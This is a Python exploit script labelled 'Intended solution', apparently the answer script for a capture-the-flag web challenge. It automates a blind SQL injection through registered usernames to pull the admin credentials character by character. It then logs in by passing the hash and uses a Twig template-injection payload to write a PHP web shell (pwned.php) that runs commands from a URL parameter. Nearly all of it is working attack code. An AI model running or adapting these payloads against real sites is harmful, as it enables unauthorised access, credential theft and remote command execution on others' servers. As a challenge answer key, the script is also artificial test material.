### Intended solution ###
import hashlib, string, requests, sys, argparse
 
parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="IP address of the target.")
args = parser.parse_args()
 
if not args.target:
    parser.print_help()
    sys.exit(0)
 
PROXY = {
    "http" : "http://127.0.0.1:8080"    
}
 
TARGET = args.target
 
def sha1(string):
    m = hashlib.sha1()
    m.update(string.encode('utf-8'))
    return m.hexdigest()
 
def Login(username, password='test', admin=False):
    password = password if admin else sha1(sha1(password) + "swag")
    session = requests.session()
    url = f"http://{TARGET}/login.php" if not admin else f"http://{TARGET}/admin/login.php"
    data = {"form_password_hidden": password, "username": username, "password": '', "submit": "Submit","token" : "swag"}
    session.post(url, data=data,proxies=PROXY)
    cookies = session.cookies.get_dict()
 
    if admin:
        payload = "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('echo \"<?php system($_GET[0]); ?>\" > pwned.php')}}"
        exploitUrl = f"http://{TARGET}/admin/welcome.php"
        data = {"name": payload, "submit": ''}
        requests.post(exploitUrl, cookies=cookies, data=data,proxies=PROXY)
    else:
        return CheckResponse(cookies) 
 
def CheckResponse(cookies):
    r = requests.get(f"http://{TARGET}/user_log.php", cookies=cookies, proxies=PROXY)
    return len(r.content)
 
 
def Register(payload, password='test'):
    password = sha1(password)
    url = f"http://{TARGET}/register.php"
    data = {"form_password_hidden": password, "username": payload, "password": '', "register": "Submit"}
    requests.post(url, data=data)
    return Login(payload)
 
def Bruteforce(payload):
    FALSERESPONSE = Register("' or 1=2 -- -")
    index = 1
    falseInARow = 0
    output = ""
    for i in range(1000):
        if falseInARow > 96:
            break
 
        for char in string.printable[:-6]:
            if Register(payload.replace("[P]",char).replace("[C]", str(index))) != FALSERESPONSE:
                falseInARow = 0
                output += char
                sys.stdout.write(char)
                sys.stdout.flush()
                index += 1
                break
            else:
                falseInARow += 1
    print()
    return output
 
def AdminLogin(username, password):
    Login(username, password, admin=True)
 
def CheckShell():
    print("Exploiting SSTI")
    r = requests.get(f"http://{TARGET}/admin/pwned.php").status_code
    if r == 200:
        print("Webshell successfully uploaded")
    else:
        print("Webshell not found")
 
def Main():
    print("Fetching Username: ", end='')
    username = Bruteforce("' or (SELECT SUBSTRING(username,[C],1) from admin where id = 1) = '[P]' -- -")
    print("Fetching password: ", end='')
    password = Bruteforce("' or (SELECT SUBSTRING(password,[C],1) from admin where id = 1) = '[P]' -- -")
    password = sha1(password + "swag")
    print(f"Passing the hash with {password}")
    AdminLogin(username, password)
    CheckShell()
 
if __name__ == '__main__':
    Main()